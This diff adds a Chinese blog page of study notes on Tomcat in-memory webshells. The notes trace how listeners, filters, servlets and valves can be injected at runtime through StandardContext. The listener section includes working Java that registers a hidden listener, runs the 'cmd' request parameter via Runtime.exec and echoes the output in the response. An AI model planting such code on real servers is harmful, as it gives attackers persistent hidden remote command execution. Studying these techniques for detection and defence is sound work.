@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+
+    
+
+    
+<div class="hd posts">
+
+    <div style="position: fixed; ;left: 100px;">
+        
+        <a href="#only-sql">only-sql</a>
+    </div>
+
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            tomcat内存马学习
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>重新开始，征战Java大陆。</p>
+<p>主要参考两位大爹的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/">https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
+<h1 id="使用内置tomcat"><a href="#使用内置tomcat" class="headerlink" title="使用内置tomcat"></a>使用内置tomcat</h1><p>懒得每次都配tomcat了，直接写进代码里。</p>
+<p>依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.81&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.81&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>启动程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws LifecycleException &#123;</span><br><span class="line">        Tomcat tomcat = new Tomcat();</span><br><span class="line">        tomcat.setPort(8083);</span><br><span class="line">        tomcat.getConnector();</span><br><span class="line"></span><br><span class="line">        //第二部分</span><br><span class="line">        //浏览器访问第一个参数contextPath，即访问的是src/main/webapp下的文件</span><br><span class="line">        Context ctx = tomcat.addWebapp(&quot;&quot;, new File(&quot;src/main/webapp&quot;).getAbsolutePath());</span><br><span class="line">        WebResourceRoot resources = new StandardRoot(ctx);</span><br><span class="line">        resources.addPreResources(</span><br><span class="line">                // /WEB-INF/classes挂载在target/classes，即编译出来的class文件</span><br><span class="line">                new DirResourceSet(resources, &quot;/WEB-INF/classes&quot;, new File(&quot;target/classes&quot;).getAbsolutePath(), &quot;/&quot;));</span><br><span class="line">        ctx.setResources(resources);</span><br><span class="line"></span><br><span class="line">        //第三部分</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用注解注册Servlet、Listener、Filter。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@WebListener</span><br><span class="line">@WebServlet(urlPatterns = &quot;/servlet&quot;)</span><br><span class="line">@WebFilter(urlPatterns = &quot;/*&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>目录结构</p>
+<p>webapp下不用放其他东西。</p>
+<p>tomcat.8083是自动生成的。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240204232140389.png" alt="image-20240204232140389.png"></p>
+<p>直接启动</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240204232117579.png" alt="image-20240204232117579.png"></p>
+<h1 id="listener内存马分析"><a href="#listener内存马分析" class="headerlink" title="listener内存马分析"></a>listener内存马分析</h1><p>1、Tomcat中的三个Context。</p>
+<p>ServletContext是接口。</p>
+<p>ApplicationContext implements ServletContext。</p>
+<p>ApplicationContext中的大部分操作都是基于this.context。ApplicationContext的context属性是StandardContext。</p>
+<p>所以：StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互。后续添加监听器都是通过StandardContext进行。</p>
+<p>2、Listener有两大类：LifecycleLisntener和EventListener</p>
+<p>LifecycleListener接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马。</p>
+<p>所以重点看EventListener。</p>
+<p>3、StandardContext的getApplicationEventListeners返回一个数组，这个数组保存了所有的EventListener。所以接下来要实现的是获取StandardContext对象，然后将Listener马加入到数组中。</p>
+<p>4、在Listener马的requestDestroyed方法中rce，并结合<strong>tomcat回显技术</strong>将结果带回。（tomcat回显技术得另外讲）</p>
+<p>注册Listener马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Request request = (Request)Util.getFieldValue(req, &quot;request&quot;);</span><br><span class="line">            StandardContext context = (StandardContext)request.getContext();</span><br><span class="line"></span><br><span class="line">// 			自己debug时写出的获取方式</span><br><span class="line">//            Object applicationMapping = Util.getFieldValue(request, &quot;applicationMapping&quot;);</span><br><span class="line">//            MappingData mappingData = (MappingData)Util.getFieldValue(applicationMapping, &quot;mappingData&quot;);</span><br><span class="line">//            StandardContext context = (StandardContext)mappingData.context;</span><br><span class="line"></span><br><span class="line">            context.addApplicationEventListener(new MyListener());</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Listener马内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MyListener implements ServletRequestListener &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        //获取HttpServletRequest对象，用于RCE</span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        if (req.getParameter(&quot;cmd&quot;) != null)&#123;</span><br><span class="line">            InputStream in = null;</span><br><span class="line">            try &#123;</span><br><span class="line">                //指令结果的输入流</span><br><span class="line">                in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)&#125;).getInputStream();</span><br><span class="line">                    /*</span><br><span class="line">scanner.useDelimiter命令在于设置当前scanner的分隔符,默认是空格,\\A为正则表达式,表示从字符头开始</span><br><span class="line">这条语句的整体意思就是读取所有输入,包括回车换行符</span><br><span class="line">                        */</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                //获得结果</span><br><span class="line">                String out = s.hasNext()?s.next():&quot;&quot;;</span><br><span class="line">                //获取request对象</span><br><span class="line">                Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">                requestF.setAccessible(true);</span><br><span class="line">                Request request = (Request)requestF.get(req);</span><br><span class="line">                //回显技术</span><br><span class="line">                request.getResponse().getWriter().write(out);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException e) &#123;&#125;</span><br><span class="line">            catch (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">            catch (IllegalAccessException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        System.out.println(&quot;requestInitialized!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="filter-内存马分析"><a href="#filter-内存马分析" class="headerlink" title="filter 内存马分析"></a>filter 内存马分析</h1><p>要找到context是如何记住一个filter的，然后手动加入恶意filter。</p>
+<p>调试第一处：手写一个正常的Filter，然后将断点打在doFilter处，发送请求，到达断点，向下查看调用栈。</p>
+<p>调用栈中，StandardWrapperValue的invoke方法有这个操作，跟进去。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ApplicationFilterChain filterChain =</span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>
+
+<p>在里面遍历context的FilterMaps，如果请求的路径匹配到了FilterMap的urlPattern，则将这个FilterMap加入filterChain中。遍历过程中，如果这个Filter没有对应的filterConfig，则不加入，直接continue。</p>
+<p>调试第二处：手写一个正常的Filter，然后将断点打在init处，启动调试，无需发送请求即可到达断点， 向下查看调用栈。</p>
+<p>调用栈中，查看StandardContext的filterStart代码，有这一个操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ApplicationFilterConfig filterConfig =</span><br><span class="line">                            new ApplicationFilterConfig(this, entry.getValue());</span><br></pre></td></tr></table></figure>
+
+<p>其中，this就是StandardContext，entry.getValue()是一个FilterDef。</p>
+<p>总结：</p>
+<p>1、FilterMap保存filterName和urlPattern。相当于web.xml里的&lt;filter-mapping&gt;</p>
+<p>2、FilterDef保存filterName和实际Filter对象。相当于web.xml里的&lt;filter&gt;</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205104822606.png" alt="image-20240205104822606.png"></p>
+<p>3、FilterConfig保存filterName和filterConfig。filterConfig中有FilterDef。</p>
+<p>内存马的构造即完成上述3个对象。</p>
+<p>主要代码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205105142056.png" alt="image-20240205105142056.png"></p>
+<h1 id="Servlet内存马分析"><a href="#Servlet内存马分析" class="headerlink" title="Servlet内存马分析"></a>Servlet内存马分析</h1><p>调试方式：断点打在ContextConfig的configureStart()方法，里面有一个操作webConfig()。webConfig是解析web.xml文件和注解。</p>
+<p>然后将解析得到的webxml传入configureContext，开始创建wrapper。</p>
+<p>此时的调用栈</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205142913743.png" alt="image-20240205142913743.png"></p>
+<p>在configureContext中，创建wrapper，然后<code>context.addChild(wrapper);</code>。</p>
+<p>然后<code>context.addServletMappingDecoded(entry.getKey(), entry.getValue());</code>，第一个参数是路由，第二个是wrapper的名字。</p>
+<p>然后回到<code>fireLifecycleEvent</code>，往下翻，可以看到<code>loadOnStartup</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205143509015.png" alt="image-20240205143509015.png"></p>
+<p>这里面的主要作用是，检查哪些Servlet有loadOnStartup参数（web.xml或注解配置的），有的话立刻加载，即执行<code>wrapper.load()</code>，没有的话等到被访问的时候才加载。</p>
+<p>所以内存马编写主要参考<code>configureContext</code>里创建wrapper和添加路由的写法，完成这些后即可访问。至于有没有<code>loadOnStartup</code>不重要。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205143912760.png" alt="image-20240205143912760.png"></p>
+<h1 id="value内存马分析"><a href="#value内存马分析" class="headerlink" title="value内存马分析"></a>value内存马分析</h1><p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205145816667.png" alt="image-20240205145816667.png"></p>
+<p>一个请求进入Engine后，Engine调用自己的pipline的第一个value的invoke，value的invoke又调用下一个value的invoke，像链表一样逐级向下调用，最终调用到Servlet。</p>
+<p>所以value内存马注入思路：在Context的pipline里加入一个恶意value。恶意value里也要调用下一个value的invoke，保证下面正常调用。</p>
+<p>理论上在Engine和Host里注入也可以，但是还没研究如何获取Host或Engine。</p>
+<p>内存马代码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205151206002.png" alt="image-20240205151206002.png"></p>
+<p>为什么<code>getNext().invoke</code>放在else里：Context的后面是wrapper。假如在if里最底下也invoke，则：访问不存在路由时，wrapper找不到，res原本的命令执行结果会被404页面信息覆盖（自己猜测的）。上述写法，访问所有路由，只要带cmd参数即可回显结果。</p>
+<p>注入代码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/tomcat-memshell/image-20240205151224483.png" alt="image-20240205151224483.png"></p>
+
+    </div>
+
+    
+
+
+
+
+</div>
+
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
